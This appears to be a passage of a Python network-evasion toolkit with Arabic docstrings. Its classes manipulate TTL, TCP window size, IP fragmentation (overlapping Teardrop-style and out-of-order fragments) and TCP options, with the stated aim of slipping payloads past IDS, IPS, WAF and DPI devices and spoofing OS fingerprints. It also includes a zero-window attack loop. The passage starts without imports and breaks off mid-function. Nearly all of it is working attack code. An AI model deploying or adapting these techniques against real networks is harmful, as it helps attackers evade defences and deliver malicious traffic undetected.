# ════════════════════════════════════════════════════════════════════════
#  MODULE 1 — TTL MANIPULATION (تلاعب TTL)
# ════════════════════════════════════════════════════════════════════════

class TTLManipulator:
    """
    تلاعب بحقل TTL (Time To Live) في رؤوس IP لتجاوز أنظمة IDS/IPS.

    الاستراتيجيات المتاحة:
    ─────────────────────────────────────────────────────────────────────
    PROBE_BYPASS      — استخدام TTL صغير جداً يضمن الوصول للخادم دون
                         المرور الكامل عبر أجهزة الفحص الوسيطة.
    OS_FINGERPRINT    — محاكاة قيم TTL الافتراضية لأنظمة تشغيل بعينها
                         (Linux=64, Windows=128, Cisco=255, BSD=64).
    DECREMENT_STORM   — إرسال حزم بقيم TTL تتناقص تدريجياً لإرباك
                         محركات التتبع (traceroute-like confusion).
    SPLIT_TTL         — إرسال النص/الحمولة مقسمة عبر حزم ذات TTL مختلفة
                         بحيث تُعاد تجميعها فقط عند الخادم الهدف.
    RANDOM_JITTER     — إضافة عشوائية محكومة لقيم TTL لتجنب التعرف
                         على نمط ثابت.

    متطلبات: scapy  (pip install scapy)
    ملاحظة:  تتطلب معظم الاستراتيجيات صلاحيات root/admin لفتح
             المقابس الخام (raw sockets).
    """

    # قيم TTL الافتراضية المعروفة لأنظمة التشغيل
    OS_TTL_MAP: Dict[str, int] = {
        "linux":   64,
        "windows": 128,
        "bsd":     64,
        "macos":   64,
        "cisco":   255,
        "solaris": 255,
        "aix":     60,
        "hp-ux":   64,
    }

    # نطاقات TTL المفيدة لتجاوز الفحص الوسيط (hop-limited bypass)
    BYPASS_TTL_RANGES: List[Tuple[int, int]] = [
        (1,  3),   # ينتهي قبل معظم الـ IDS
        (4,  8),   # ينتهي في منطقة الشبكة المحيطة
        (60, 70),  # يمر الـ IDS لكن يصل الخادم
    ]

    def __init__(self, strategy: str = "OS_FINGERPRINT", target_os: str = "linux"):
        """
        Args:
            strategy:   إحدى الاستراتيجيات المذكورة في docstring.
            target_os:  نظام التشغيل المراد محاكاة TTL الخاص به.
        """
        self.strategy   = strategy.upper()
        self.target_os  = target_os.lower()
        self._hop_count = 0
        self._ttl_log: List[Dict[str, Any]] = []

    # ── حساب قيمة TTL وفق الاستراتيجية المختارة ──────────────────────
    def compute_ttl(self, hop: int = 0, payload_len: int = 0) -> int:
        """
        أعِد قيمة TTL المناسبة بناءً على الاستراتيجية.

        Args:
            hop:         رقم الـ hop الحالي (للاستراتيجيات التسلسلية).
            payload_len: طول الحمولة (يؤثر على SPLIT_TTL).

        Returns:
            قيمة TTL صحيحة في النطاق [1, 255].
        """
        if self.strategy == "OS_FINGERPRINT":
            base = self.OS_TTL_MAP.get(self.target_os, 64)
            # إضافة تشويش طفيف ±2 لإخفاء الطابع الآلي
            jitter = random.randint(-2, 2)
            ttl = max(1, min(255, base + jitter))

        elif self.strategy == "PROBE_BYPASS":
            # TTL صغير لتجاوز أجهزة الفحص الوسيطة
            rng = random.choice(self.BYPASS_TTL_RANGES)
            ttl = random.randint(*rng)

        elif self.strategy == "DECREMENT_STORM":
            # يبدأ من 255 وينقص مع كل hop
            ttl = max(1, 255 - (hop * random.randint(3, 7)))

        elif self.strategy == "SPLIT_TTL":
            # حزم مختلفة لها TTL مختلفة: الأولى منخفضة، الأخيرة عالية
            ttl = 32 + (hop % 8) * 16
            ttl = max(1, min(255, ttl))

        elif self.strategy == "RANDOM_JITTER":
            # TTL عشوائي تماماً لكل حزمة
            ttl = random.randint(48, 255)

        else:
            ttl = 64  # افتراضي آمن

        self._ttl_log.append({"hop": hop, "strategy": self.strategy, "ttl": ttl})
        return ttl

    # ── إرسال حزمة TCP واحدة بـ TTL محسوب ────────────────────────────
    def send_packet(
        self,
        dst_ip: str,
        dst_port: int,
        payload: bytes = b"",
        src_port: int = 0,
        flags: str = "S",
        hop: int = 0,
        timeout: float = 2.0,
    ) -> Optional[Any]:
        """
        أرسل حزمة TCP مع TTL مُحسوب وفق الاستراتيجية.

        Args:
            dst_ip:   عنوان IP الوجهة.
            dst_port: منفذ الوجهة.
            payload:  بيانات الطبقة التطبيقية (raw bytes).
            src_port: المنفذ المصدر (0 = عشوائي).
            flags:    علامات TCP ("S", "A", "SA", "PA", ...).
            hop:      رقم الـ hop (للاستراتيجيات التسلسلية).
            timeout:  مهلة الانتظار بالثواني للرد.

        Returns:
            حزمة الرد من Scapy أو None إذا انتهت المهلة.

        Raises:
            RuntimeError: إذا لم يكن Scapy مثبتاً.
        """
        if not HAS_SCAPY:
            raise RuntimeError(
                "TTLManipulator.send_packet() تتطلب scapy. "
                "نفّذ: pip install scapy"
            )
        ttl      = self.compute_ttl(hop=hop, payload_len=len(payload))
        sp       = src_port or random.randint(1024, 65535)
        ip_layer = IP(dst=dst_ip, ttl=ttl)
        tcp_layer= TCP(sport=sp, dport=dst_port, flags=flags)
        pkt      = ip_layer / tcp_layer / Raw(load=payload) if payload else ip_layer / tcp_layer
        log("INFO", f"[TTL] Sending {flags} → {dst_ip}:{dst_port} | TTL={ttl} | Strategy={self.strategy}")
        reply = sr1(pkt, timeout=timeout, verbose=0)
        return reply

    # ── مسح TTL لتعيين عدد الـ hops حتى الهدف ───────────────────────
    def probe_hop_distance(self, dst_ip: str, dst_port: int = 80) -> int:
        """
        استخدام حزم TCP-SYN بقيم TTL متصاعدة لتحديد عدد الـ hops
        حتى الهدف (يشبه traceroute لكن عبر TCP).

        Returns:
            عدد الـ hops المكتشف، أو -1 إذا فشل الاكتشاف.
        """
        if not HAS_SCAPY:
            raise RuntimeError("probe_hop_distance() تتطلب scapy.")
        for ttl_val in range(1, 32):
            pkt = IP(dst=dst_ip, ttl=ttl_val) / TCP(dport=dst_port, flags="S")
            reply = sr1(pkt, timeout=1.0, verbose=0)
            if reply is None:
                continue
            if reply.haslayer(TCP) and reply[TCP].flags in (0x12, 0x14):
                # SYN-ACK أو RST — وصلنا للهدف
                log("OK", f"[TTL] Hop distance to {dst_ip}:{dst_port} = {ttl_val}")
                return ttl_val
            # ICMP time-exceeded — لا نزال في الوسط
        return -1

    # ── تقرير موجز بالحزم المُرسَلة ─────────────────────────────────
    def report(self) -> Dict[str, Any]:
        """أعد تقريراً بكل قيم TTL التي استُخدمت."""
        return {
            "strategy":    self.strategy,
            "target_os":   self.target_os,
            "packets_sent": len(self._ttl_log),
            "ttl_values":  [e["ttl"] for e in self._ttl_log],
            "log":         self._ttl_log,
        }

    # ── دعم استخدام raw socket بدون Scapy (fallback) ─────────────────
    def apply_ttl_to_socket(self, sock: socket.socket, hop: int = 0) -> int:
        """
        طبّق TTL المحسوب على مقبس Python قياسي (لا يتطلب Scapy).
        يستخدم IP_TTL socket option.

        Args:
            sock: مقبس socket.socket مفتوح.
            hop:  رقم الـ hop للاستراتيجيات التسلسلية.

        Returns:
            قيمة TTL التي طُبِّقت.
        """
        ttl = self.compute_ttl(hop=hop)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
        log("INFO", f"[TTL] Socket TTL set to {ttl} (strategy={self.strategy})")
        return ttl

    # ── استراتيجية SPLIT_TTL: تقسيم الحمولة ─────────────────────────
    def split_payload_send(
        self,
        dst_ip: str,
        dst_port: int,
        http_request: bytes,
        chunk_size: int = 8,
        inter_delay: float = 0.05,
    ) -> List[Any]:
        """
        قسّم طلب HTTP إلى أجزاء صغيرة وأرسل كل جزء في حزمة TCP
        مستقلة بـ TTL مختلف. يُرهق أجهزة فحص الحالة (stateful DPI).

        Args:
            http_request: الطلب كاملاً بصيغة bytes.
            chunk_size:   حجم كل جزء بالبايت.
            inter_delay:  تأخير بين الحزم (ثانية).

        Returns:
            قائمة بردود Scapy (قد تحتوي None).
        """
        if not HAS_SCAPY:
            raise RuntimeError("split_payload_send() تتطلب scapy.")
        replies   = []
        seq_base  = random.randint(10000, 2**31)
        sp        = random.randint(1024, 65535)
        # SYN
        syn_pkt   = IP(dst=dst_ip, ttl=self.compute_ttl(hop=0)) / TCP(
            sport=sp, dport=dst_port, flags="S", seq=seq_base
        )
        syn_reply = sr1(syn_pkt, timeout=2.0, verbose=0)
        if syn_reply is None or not syn_reply.haslayer(TCP):
            log("WARN", f"[TTL-Split] SYN to {dst_ip}:{dst_port} timed out")
            return replies
        server_seq = syn_reply[TCP].seq + 1
        # ACK
        ack_pkt = IP(dst=dst_ip, ttl=self.compute_ttl(hop=1)) / TCP(
            sport=sp, dport=dst_port, flags="A",
            seq=seq_base + 1, ack=server_seq
        )
        send(ack_pkt, verbose=0)
        # إرسال الحمولة في أجزاء
        chunks = [
            http_request[i:i + chunk_size]
            for i in range(0, len(http_request), chunk_size)
        ]
        client_seq = seq_base + 1
        for idx, chunk in enumerate(chunks):
            ttl = self.compute_ttl(hop=idx + 2)
            data_pkt = IP(dst=dst_ip, ttl=ttl) / TCP(
                sport=sp, dport=dst_port, flags="PA",
                seq=client_seq, ack=server_seq
            ) / Raw(load=chunk)
            reply = sr1(data_pkt, timeout=1.0, verbose=0)
            replies.append(reply)
            client_seq += len(chunk)
            time.sleep(inter_delay)
        log("OK", f"[TTL-Split] Sent {len(chunks)} chunks with variable TTL to {dst_ip}:{dst_port}")
        return replies


# ════════════════════════════════════════════════════════════════════════
#  MODULE 2 — TCP WINDOW SIZE MANIPULATION (تلاعب TCP Window Size)
# ════════════════════════════════════════════════════════════════════════

class TCPWindowManipulator:
    """
    تلاعب بحقل TCP Window Size لتجاوز أجهزة IDS/IPS وأنظمة DPI.

    الاستراتيجيات:
    ─────────────────────────────────────────────────────────────────────
    ZERO_WINDOW      — إعلان نافذة صفرية لإيقاف الإرسال مؤقتاً
                        (يُستخدم في هجمات TCP Window = 0).
    TINY_WINDOW      — نوافذ صغيرة جداً (1–4 بايت) تُجبر الخادم
                        على إرسال حزم صغيرة جداً مما يُشوّش DPI.
    LARGE_WINDOW     — نوافذ ضخمة (65535 أو أكبر مع WSCALE) تتجاوز
                        حدود بعض المحللات.
    OSCILLATING      — تردد سريع بين نوافذ كبيرة وصغيرة لإرباك
                        محركات تتبع حالة TCP.
    OS_PROFILE       — محاكاة قيم نوافذ TCP المعروفة لأنظمة تشغيل
                        بعينها (Linux=29200, Windows=65535, macOS=65535).
    GRADUAL_SHRINK   — تقليص تدريجي للنافذة لاختبار استجابة الخادم.

    متطلبات: scapy أو raw socket (Python قياسي).
    """

    # قيم Window الافتراضية لأنظمة التشغيل الشائعة
    OS_WINDOW_MAP: Dict[str, int] = {
        "linux":   29200,
        "windows": 65535,
        "macos":   65535,
        "bsd":     65535,
        "android": 14600,
        "ios":     65535,
    }

    # نطاقات Window المستخدمة في استراتيجية TINY_WINDOW
    TINY_WINDOW_VALUES = [1, 2, 3, 4, 8, 16, 32, 64]

    def __init__(
        self,
        strategy: str = "OS_PROFILE",
        target_os: str = "linux",
        wscale_factor: int = 0,
    ):
        """
        Args:
            strategy:      الاستراتيجية (انظر docstring).
            target_os:     نظام التشغيل للمحاكاة (OS_PROFILE فقط).
            wscale_factor: معامل TCP Window Scale (0 = معطّل).
        """
        self.strategy      = strategy.upper()
        self.target_os     = target_os.lower()
        self.wscale_factor = max(0, min(wscale_factor, 14))
        self._step         = 0
        self._window_log: List[int] = []

    def compute_window(self) -> int:
        """
        احسب قيمة الـ Window المناسبة بناءً على الاستراتيجية.

        Returns:
            قيمة Window في النطاق [0, 65535].
        """
        self._step += 1
        if self.strategy == "ZERO_WINDOW":
            win = 0

        elif self.strategy == "TINY_WINDOW":
            win = random.choice(self.TINY_WINDOW_VALUES)

        elif self.strategy == "LARGE_WINDOW":
            win = 65535

        elif self.strategy == "OSCILLATING":
            # تبديل بين كبيرة وصغيرة مع كل خطوة
            win = 65535 if (self._step % 2 == 0) else random.choice(self.TINY_WINDOW_VALUES)

        elif self.strategy == "OS_PROFILE":
            base = self.OS_WINDOW_MAP.get(self.target_os, 29200)
            # تشويش بسيط ±512
            win = max(0, min(65535, base + random.randint(-512, 512)))

        elif self.strategy == "GRADUAL_SHRINK":
            # يبدأ من 65535 وينقص 4096 مع كل خطوة
            win = max(0, 65535 - (self._step * 4096))

        else:
            win = 8192

        self._window_log.append(win)
        return win

    def build_tcp_options(self) -> list:
        """
        أنشئ قائمة TCP Options تتضمن Window Scale إذا كان مفعّلاً.

        Returns:
            قائمة tuples صالحة لـ Scapy TCP options.
        """
        opts = [("MSS", 1460), ("NOP", None), ("NOP", None)]
        if self.wscale_factor > 0:
            opts.append(("WScale", self.wscale_factor))
        opts.append(("SAckOK", b""))
        return opts

    def send_with_custom_window(
        self,
        dst_ip: str,
        dst_port: int,
        payload: bytes = b"",
        flags: str = "PA",
        seq: int = 1000,
        ack: int = 1,
        src_port: int = 0,
        timeout: float = 2.0,
    ) -> Optional[Any]:
        """
        أرسل حزمة TCP بـ Window Size مُحسوب وفق الاستراتيجية.

        Args:
            flags:    علامات TCP.
            seq/ack:  أرقام التسلسل والتأكيد.
        """
        if not HAS_SCAPY:
            raise RuntimeError(
                "send_with_custom_window() تتطلب scapy. "
                "نفّذ: pip install scapy"
            )
        win = self.compute_window()
        sp  = src_port or random.randint(1024, 65535)
        tcp_layer = TCP(
            sport=sp, dport=dst_port,
            flags=flags, seq=seq, ack=ack,
            window=win,
        )
        ip_layer = IP(dst=dst_ip)
        pkt = ip_layer / tcp_layer / Raw(load=payload) if payload else ip_layer / tcp_layer
        log("INFO", f"[Win] Sending TCP win={win} strategy={self.strategy} → {dst_ip}:{dst_port}")
        reply = sr1(pkt, timeout=timeout, verbose=0)
        return reply

    def zero_window_probe(
        self,
        dst_ip: str,
        dst_port: int,
        duration: float = 5.0,
        interval: float = 0.5,
    ) -> int:
        """
        أرسل نوافذ صفرية باستمرار لإيقاف الإرسال من الخادم (Zero Window Attack).
        يختبر استجابة الخادم لحالة الإغلاق الجزئي.

        Args:
            duration: مدة الهجوم بالثواني.
            interval: الفترة بين حزم Zero Window.

        Returns:
            عدد الحزم المُرسَلة.
        """
        if not HAS_SCAPY:
            raise RuntimeError("zero_window_probe() تتطلب scapy.")
        count = 0
        end_t = time.time() + duration
        sp    = random.randint(1024, 65535)
        seq   = random.randint(10000, 2**31)
        log("INFO", f"[Win-0] Zero window probe → {dst_ip}:{dst_port} for {duration}s")
        while time.time() < end_t:
            pkt = IP(dst=dst_ip) / TCP(
                sport=sp, dport=dst_port,
                flags="A", window=0,
                seq=seq + count, ack=1
            )
            send(pkt, verbose=0)
            count += 1
            time.sleep(interval)
        log("OK", f"[Win-0] Sent {count} zero-window probes to {dst_ip}:{dst_port}")
        return count

    def apply_window_to_socket(self, sock: socket.socket) -> int:
        """
        طبّق Window Size المحسوب على مقبس Python قياسي عبر SO_RCVBUF.
        (تقريب — Python لا يعرض TCP window مباشرةً، لكن SO_RCVBUF
         يؤثر على الـ window المُعلَن).

        Returns:
            قيمة الـ window التي حُسبت.
        """
        win = self.compute_window()
        # SO_RCVBUF = receive buffer size (يؤثر على TCP window)
        try:
            buf = max(256, win) if win > 0 else 256
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, buf)
            log("INFO", f"[Win] Socket SO_RCVBUF={buf} (strategy={self.strategy})")
        except OSError as e:
            log("WARN", f"[Win] setsockopt SO_RCVBUF failed: {e}")
        return win

    def report(self) -> Dict[str, Any]:
        """أعد تقريراً بكل قيم Window المستخدمة."""
        return {
            "strategy":       self.strategy,
            "target_os":      self.target_os,
            "wscale_factor":  self.wscale_factor,
            "packets_sent":   len(self._window_log),
            "window_values":  self._window_log,
            "min_window":     min(self._window_log) if self._window_log else 0,
            "max_window":     max(self._window_log) if self._window_log else 0,
        }


# ════════════════════════════════════════════════════════════════════════
#  MODULE 3 — IP FRAGMENTATION ENGINE (تجزئة الحزم)
# ════════════════════════════════════════════════════════════════════════

class IPFragmentationEngine:
    """
    تجزئة حزم IP لتجاوز أجهزة فحص الحزم (IDS/IPS/WAF).

    مبدأ العمل:
    ─────────────────────────────────────────────────────────────────────
    يقسّم الـ engine حزمة IP واحدة إلى أجزاء صغيرة متعددة. كثير من
    أجهزة الفحص تفحص كل جزء على حدة ولا تُعيد التجميع الكامل قبل
    تطبيق قواعد الكشف، مما يسمح بتمرير حمولات ضارة.

    الاستراتيجيات:
    ─────────────────────────────────────────────────────────────────────
    STANDARD         — تجزئة عادية بحجم MTU محدد.
    TINY_FRAGMENTS   — شرائح صغيرة جداً (8 بايت) تُصعّب إعادة التجميع.
    OVERLAPPING      — شرائح متداخلة: يُرسَل جزء أولاً ثم يُرسَل جزء
                        آخر يتداخل معه في الـ offset. عند التعارض يختار
                        الخادم القيمة الأحدث (يُعرف بـ Teardrop variant).
    OUT_OF_ORDER     — إرسال الأجزاء بترتيب عشوائي (الأخير أولاً مثلاً)
                        لإرباك آليات إعادة التجميع في الـ IDS.
    RESERVED_FLAG    — تعيين بت "Reserved" (Evil Bit – RFC 3514) في
                        كل جزء لتجاوز فلاتر تتحقق من هذا الحقل.

    متطلبات: scapy (pip install scapy)
    """

    # الحجم الأدنى لجسم IP fragment بالبايت (يجب أن يكون مضاعف 8)
    MIN_FRAG_SIZE: int = 8
    # MTU افتراضي
    DEFAULT_MTU: int = 1500

    def __init__(
        self,
        strategy: str = "STANDARD",
        frag_size: int = 24,
        inter_frag_delay: float = 0.01,
    ):
        """
        Args:
            strategy:          استراتيجية التجزئة.
            frag_size:         حجم كل جزء بالبايت (يُقرَّب لمضاعف 8).
            inter_frag_delay:  تأخير بين كل جزء وآخر (ثانية).
        """
        self.strategy         = strategy.upper()
        # تأكد أن frag_size مضاعف 8 (متطلب IP fragmentation)
        self.frag_size        = max(self.MIN_FRAG_SIZE, (frag_size // 8) * 8)
        self.inter_frag_delay = inter_frag_delay
        self._frag_log: List[Dict[str, Any]] = []

    # ── بناء قائمة الأجزاء وفق الاستراتيجية ─────────────────────────
    def _build_fragments(self, pkt: Any) -> List[Any]:
        """
        قسّم الحزمة إلى fragments وفق الاستراتيجية المختارة.

        Args:
            pkt: حزمة Scapy IP كاملة.

        Returns:
            قائمة حزم Scapy جاهزة للإرسال.
        """
        if not HAS_SCAPY:
            raise RuntimeError("IPFragmentationEngine يتطلب scapy.")

        if self.strategy == "STANDARD":
            frags = fragment(pkt, fragsize=self.frag_size)

        elif self.strategy == "TINY_FRAGMENTS":
            frags = fragment(pkt, fragsize=self.MIN_FRAG_SIZE)

        elif self.strategy == "OUT_OF_ORDER":
            frags = fragment(pkt, fragsize=self.frag_size)
            random.shuffle(frags)

        elif self.strategy == "OVERLAPPING":
            frags = fragment(pkt, fragsize=self.frag_size)
            # أضف جزءاً مزيفاً يتداخل مع الأول
            if len(frags) >= 2:
                ghost = frags[0].copy()
                ghost[IP].frag = 0
                ghost[IP].flags = 1  # More Fragments
                ghost[Raw].load = b"\x00" * len(frags[0][Raw].load)
                frags.insert(1, ghost)

        elif self.strategy == "RESERVED_FLAG":
            frags = fragment(pkt, fragsize=self.frag_size)
            for f in frags:
                # Evil Bit (Reserved) = بت 0 في حقل الـ flags
                f[IP].flags = int(f[IP].flags) | 0x4

        else:
            frags = fragment(pkt, fragsize=self.frag_size)

        return frags

    # ── إرسال طلب HTTP مجزّء عبر UDP/TCP ─────────────────────────────
    def send_fragmented_tcp(
        self,
        dst_ip: str,
        dst_port: int,
        payload: bytes,
        src_port: int = 0,
    ) -> int:
        """
        أرسل حمولة TCP مجزّأة على مستوى IP.

        ملاحظة: هذا يتطلب أن يدعم النظام إرسال حزم IP خام
                مع DF=0 (لا يُحظر التجزئة).

        Args:
            payload:  بيانات التطبيق (HTTP request مثلاً).
            src_port: المنفذ المصدر (0 = عشوائي).

        Returns:
            عدد الأجزاء المُرسَلة.
        """
        if not HAS_SCAPY:
            raise RuntimeError("send_fragmented_tcp() يتطلب scapy.")
        sp  = src_port or random.randint(1024, 65535)
        # بناء الحزمة الكاملة أولاً
        pkt = IP(dst=dst_ip, flags=0) / TCP(
            sport=sp, dport=dst_port, flags="PA"
        ) / Raw(load=payload)
        frags = self._build_fragments(pkt)
        count = 0
        log("INFO",
            f"[Frag] Sending {len(frags)} fragments "
            f"(strategy={self.strategy}, size={self.frag_size}B) → {dst_ip}:{dst_port}"
        )
        for f in frags:
            send(f, verbose=0)
            self._frag_log.append({
                "strategy": self.strategy,
                "offset":   f[IP].frag * 8,
                "len":      len(f),
                "flags":    int(f[IP].flags),
            })
            count += 1
            time.sleep(self.inter_frag_delay)
        log("OK", f"[Frag] {count} fragments sent to {dst_ip}:{dst_port}")
        return count

    # ── تجزئة UDP (أبسط — لا تتطلب handshake) ──────────────────────
    def send_fragmented_udp(
        self,
        dst_ip: str,
        dst_port: int,
        payload: bytes,
        src_port: int = 0,
    ) -> int:
        """
        أرسل حمولة UDP مجزّأة. مفيد لاختبار أجهزة الفحص على DNS/QUIC.
        """
        if not HAS_SCAPY:
            raise RuntimeError("send_fragmented_udp() يتطلب scapy.")
        sp  = src_port or random.randint(1024, 65535)
        pkt = IP(dst=dst_ip, flags=0) / UDP(sport=sp, dport=dst_port) / Raw(load=payload)
        frags = self._build_fragments(pkt)
        for f in frags:
            send(f, verbose=0)
            time.sleep(self.inter_frag_delay)
        log("OK", f"[Frag-UDP] {len(frags)} fragments sent to {dst_ip}:{dst_port}")
        return len(frags)

    # ── كشف ما إذا كان الهدف يُعيد تجميع الأجزاء ───────────────────
    def probe_reassembly_support(self, dst_ip: str, dst_port: int = 80) -> bool:
        """
        اختبر ما إذا كان الخادم الهدف يُعيد تجميع الأجزاء بشكل صحيح
        عن طريق إرسال طلب HTTP مجزّأ ومحاولة قراءة الرد.

        Returns:
            True إذا وصل رد HTTP كامل (تجميع ناجح)، False خلاف ذلك.
        """
        if not HAS_SCAPY:
            raise RuntimeError("probe_reassembly_support() يتطلب scapy.")
        http_req = (
            f"GET / HTTP/1.0\r\nHost: {dst_ip}\r\n\r\n"
        ).encode()
        # استخدام TINY_FRAGMENTS للتحقق
        orig_strategy = self.strategy
        self.strategy = "TINY_FRAGMENTS"
        count = self.send_fragmented_tcp(dst_ip, dst_port, http_req)
        self.strategy = orig_strategy
        return count > 0

    def report(self) -> Dict[str, Any]:
        """أعد تقريراً بتفاصيل كل fragment أُرسل."""
        return {
            "strategy":      self.strategy,
            "frag_size":     self.frag_size,
            "total_frags":   len(self._frag_log),
            "frag_log":      self._frag_log,
        }


# ════════════════════════════════════════════════════════════════════════
#  MODULE 4 — TCP OPTIONS OBFUSCATOR (تشويش TCP Options)
# ════════════════════════════════════════════════════════════════════════

class TCPOptionsObfuscator:
    """
    تشويش حقل TCP Options لتجاوز أنظمة الكشف القائمة على بصمة TCP.

    خلفية تقنية:
    ─────────────────────────────────────────────────────────────────────
    حقل TCP Options يظهر في حزمة SYN ويحمل عادةً:
    MSS, NOP, Window Scale, SAckOK, Timestamps.
    ترتيب هذه الخيارات وقيمها يُشكّل "بصمة TCP" (TCP fingerprint)
    يستخدمها nmap وp0f وأجهزة IDS لتحديد نظام التشغيل.
    هذا الـ engine يُشوّش تلك البصمة لتجنب الكشف.

    الاستراتيجيات:
    ─────────────────────────────────────────────────────────────────────
    SHUFFLE_OPTIONS   — إعادة ترتيب الخيارات بشكل عشوائي.
    FAKE_OS_OPTIONS   — محاكاة خيارات TCP خاصة بنظام تشغيل مختلف.
    INJECT_UNKNOWN    — حقن خيارات TCP غير معروفة (kind >= 253).
    TIMESTAMP_SKEW    — إرسال قيم Timestamps خاطئة أو قديمة جداً.
    NO_OPTIONS        — حذف جميع الخيارات (SYN نظيف تماماً).
    HYBRID_CONFUSION  — مزج عدة تقنيات في حزمة واحدة.
    """

    # بصمات TCP لأنظمة تشغيل مختلفة
    OS_TCP_PROFILES: Dict[str, list] = {
        "linux_416": [
            ("MSS", 1460), ("SAckOK", b""), ("Timestamp", (0, 0)),
            ("NOP", None), ("WScale", 7),
        ],
        "windows_10": [
            ("MSS", 1460), ("NOP", None), ("WScale", 8),
            ("NOP", None), ("NOP", None), ("SAckOK", b""),
        ],
        "macos_ventura": [
            ("MSS", 1460), ("NOP", None), ("WScale", 6),
            ("NOP", None), ("NOP", None), ("Timestamp", (0, 0)),
            ("SAckOK", b""),
        ],
        "freebsd_13": [
            ("MSS", 1460), ("NOP", None), ("NOP", None),
            ("Timestamp", (0, 0)), ("SAckOK", b""), ("WScale", 6),
        ],
        "openbsd_72": [
            ("MSS", 1460), ("NOP", None), ("WScale", 6),
            ("Timestamp", (0, 0)), ("SAckOK", b""),
        ],
        "ios_16": [
            ("MSS", 1460), ("NOP", None), ("WScale", 5),
            ("NOP", None), ("NOP", None), ("Timestamp", (0, 0)),
            ("SAckOK", b""),
        ],
        "android_13": [
            ("MSS", 1412), ("SAckOK", b""), ("Timestamp", (0, 0)),
            ("NOP", None), ("WScale", 8),
        ],
    }

    def __init__(
        self,
        strategy: str = "SHUFFLE_OPTIONS",
        fake_os: str = "windows_10",
    ):
        """
        Args:
            strategy: الاستراتيجية.
            fake_os:  نظام التشغيل المراد انتحال بصمته (FAKE_OS_OPTIONS).
        """
        self.strategy = strategy.upper()
        self.fake_os  = fake_os.lower()
        self._opts_log: List[list] = []

    # ── بناء قائمة الخيارات المشوّشة ─────────────────────────────────
    def build_options(self, base_options: list = None) -> list:
        """
        أنشئ قائمة TCP Options مشوّشة وفق الاستراتيجية.

        Args:
            base_options: خيارات أساسية (اختياري).

        Returns:
            قائمة tuples صالحة لـ Scapy TCP(options=...).
        """
        if base_options is None:
            base_options = [
                ("MSS", 1460), ("SAckOK", b""),
                ("Timestamp", (int(time.time()) & 0xFFFFFFFF, 0)),
                ("NOP", None), ("WScale", 7),
            ]

        if self.strategy == "SHUFFLE_OPTIONS":
            opts = list(base_options)
            random.shuffle(opts)

        elif self.strategy == "FAKE_OS_OPTIONS":
            profile = self.OS_TCP_PROFILES.get(
                self.fake_os, self.OS_TCP_PROFILES["windows_10"]
            )
            opts = list(profile)
            # تحديث Timestamp بقيمة حالية
            opts = [
                ("Timestamp", (int(time.time()) & 0xFFFFFFFF, 0))
                if o[0] == "Timestamp" else o
                for o in opts
            ]

        elif self.strategy == "INJECT_UNKNOWN":
            opts = list(base_options)
            # حقن خيار TCP مجهول (kind=253 و kind=254 محجوزة للتجارب)
            unknown_kind = random.choice([253, 254])
            unknown_data = os.urandom(random.randint(0, 4))
            opts.insert(random.randint(0, len(opts)), (unknown_kind, unknown_data))

        elif self.strategy == "TIMESTAMP_SKEW":
            # إرسال timestamp قديم جداً أو مستقبلي
            skew = random.choice([
                0,                           # timestamp=0
                0xFFFFFFFF,                  # overflow
                int(time.time()) - 864000,   # 10 أيام في الماضي
                int(time.time()) + 864000,   # 10 أيام في المستقبل
                random.randint(1, 2**32-1),  # عشوائي
            ])
            opts = [
                ("Timestamp", (skew & 0xFFFFFFFF, 0))
                if o[0] == "Timestamp" else o
                for o in base_options
            ]
            if not any(o[0] == "Timestamp" for o in opts):
                opts.insert(0, ("Timestamp", (skew & 0xFFFFFFFF, 0)))

        elif self.strategy == "NO_OPTIONS":
            opts = []

        elif self.strategy == "HYBRID_CONFUSION":
            # مزج: ترتيب عشوائي + خيار مجهول + timestamp مشوّش
            opts = list(base_options)
            random.shuffle(opts)
            opts.append((253, os.urandom(2)))
            opts = [
                ("Timestamp", (random.randint(0, 2**32-1), random.randint(0, 2**32-1)))
                if o[0] == "Timestamp" else o
                for o in opts
            ]

        else:
            opts = list(base_options)

        self._opts_log.append(opts)
        return opts

    # ── إرسال SYN بخيارات مشوّشة ────────────────────────────────────
    def send_obfuscated_syn(
        self,
        dst_ip: str,
        dst_port: int,
        src_port: int = 0,
        ttl: int = 64,
        window: int = 29200,
        timeout: float = 3.0,
    ) -> Optional[Any]:
        """
        أرسل حزمة SYN بخيارات TCP مشوّشة لانتحال بصمة TCP.

        Args:
            ttl:     قيمة TTL (يمكن دمجها مع TTLManipulator).
            window:  حجم النافذة (يمكن دمجها مع TCPWindowManipulator).
            timeout: مهلة الانتظار للرد.

        Returns:
            حزمة الرد (SYN-ACK أو RST) أو None.
        """
        if not HAS_SCAPY:
            raise RuntimeError("send_obfuscated_syn() يتطلب scapy.")
        sp   = src_port or random.randint(1024, 65535)
        opts = self.build_options()
        pkt  = IP(dst=dst_ip, ttl=ttl) / TCP(
            sport=sp, dport=dst_port,
            flags="S", window=window,
            options=opts,
        )
        log("INFO",
            f"[TCPOpts] SYN → {dst_ip}:{dst_port} | "
            f"strategy={self.strategy} | opts={[o[0] for o in opts]}"
        )
        reply = sr1(pkt, timeout=timeout, verbose=0)
        return reply

    # ── مسح بصمة TCP للهدف ──────────────────────────────────────────
    def fingerprint_target(self, dst_ip: str, dst_port: int = 80) -> Dict[str, Any]:
        """
        أرسل SYN عادي وفحص خيارات TCP في رد SYN-ACK لتحديد
        نظام تشغيل الخادم الهدف.

        Returns:
            dict يحتوي على الخيارات المُكتشَفة وتقدير نظام التشغيل.
        """
        if not HAS_SCAPY:
            raise RuntimeError("fingerprint_target() يتطلب scapy.")
        sp    = random.randint(1024, 65535)
        probe = IP(dst=dst_ip) / TCP(
            sport=sp, dport=dst_port,
            flags="S", window=65535,
            options=[
                ("MSS", 1460), ("SAckOK", b""),
                ("Timestamp", (int(time.time()) & 0xFFFFFFFF, 0)),
                ("NOP", None), ("WScale", 6),
            ]
        )
        reply = sr1(probe, timeout=3.0, verbose=0)
        if reply is None or not reply.haslayer(TCP):
            return {"error": "No SYN-ACK received", "dst": dst_ip}
        tcp_reply = reply[TCP]
        opts_raw  = tcp_reply.options if tcp_reply.options else []
        # مطابقة مع البصمات المعروفة
        opts_keys = [o[0] for o in opts_raw]
        guessed_os = "unknown"
        for os_name, profile in self.OS_TCP_PROFILES.items():
            profile_keys = [o[0] for o in profile]
            if opts_keys == profile_keys:
                guessed_os = os_name
                break
        result = {
            "dst":        dst_ip,
            "port":       dst_port,
            "options":    opts_raw,
